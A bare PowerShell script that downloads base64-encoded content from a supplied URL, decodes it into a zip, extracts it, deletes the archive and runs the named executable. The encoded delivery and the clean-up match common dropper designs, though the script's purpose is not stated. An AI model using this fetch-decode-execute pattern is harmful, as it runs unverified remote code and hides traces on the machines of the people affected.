param (
    [string]$url,
    [string]$zipName,
    [string]$exeName
)
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$base64Content = $response.Content
$bytes = [Convert]::FromBase64String($base64Content)
$zipFilePath = "$pwd\$zipName"
[System.IO.File]::WriteAllBytes($zipFilePath, $bytes)
Expand-Archive -LiteralPath $zipFilePath -DestinationPath $pwd -Force
Remove-Item -Path $zipFilePath
Start-Process -FilePath "$pwd\$exeName"
